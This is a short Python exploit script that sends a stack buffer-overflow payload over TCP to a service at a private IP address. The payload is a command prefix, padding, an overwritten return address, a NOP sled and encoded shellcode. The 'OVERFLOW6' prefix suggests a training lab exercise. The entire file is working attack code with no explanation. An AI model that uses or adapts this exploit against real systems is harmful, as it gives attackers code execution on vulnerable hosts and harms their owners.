import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW6 '
buffer += b'A' * 1034
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xb8\x5e\x78\xf7\xf5\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x31\x83\xc2\x04\x31\x42\x0f"
shellcode += b"\x03\x42\x51\x9a\x02\x09\x85\xd8\xed\xf2\x55"
shellcode += b"\xbd\x64\x17\x64\xfd\x13\x53\xd6\xcd\x50\x31"
shellcode += b"\xda\xa6\x35\xa2\x69\xca\x91\xc5\xda\x61\xc4"
shellcode += b"\xe8\xdb\xda\x34\x6a\x5f\x21\x69\x4c\x5e\xea"
shellcode += b"\x7c\x8d\xa7\x17\x8c\xdf\x70\x53\x23\xf0\xf5"
shellcode += b"\x29\xf8\x7b\x45\xbf\x78\x9f\x1d\xbe\xa9\x0e"
shellcode += b"\x16\x99\x69\xb0\xfb\x91\x23\xaa\x18\x9f\xfa"
shellcode += b"\x41\xea\x6b\xfd\x83\x23\x93\x52\xea\x8c\x66"
shellcode += b"\xaa\x2a\x2a\x99\xd9\x42\x49\x24\xda\x90\x30"
shellcode += b"\xf2\x6f\x03\x92\x71\xd7\xef\x23\x55\x8e\x64"
shellcode += b"\x2f\x12\xc4\x23\x33\xa5\x09\x58\x4f\x2e\xac"
shellcode += b"\x8f\xc6\x74\x8b\x0b\x83\x2f\xb2\x0a\x69\x81"
shellcode += b"\xcb\x4d\xd2\x7e\x6e\x05\xfe\x6b\x03\x44\x94"
shellcode += b"\x6a\x91\xf2\xda\x6d\xa9\xfc\x4a\x06\x98\x77"
shellcode += b"\x05\x51\x25\x52\x62\xbd\xc7\x77\x9e\x56\x5e"
shellcode += b"\x12\x23\x3b\x61\xc8\x67\x42\xe2\xf9\x17\xb1"
shellcode += b"\xfa\x8b\x12\xfd\xbc\x60\x6e\x6e\x29\x87\xdd"
shellcode += b"\x8f\x78\xe4\x80\x03\xe0\xc5\x27\xa4\x83\x19"




payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
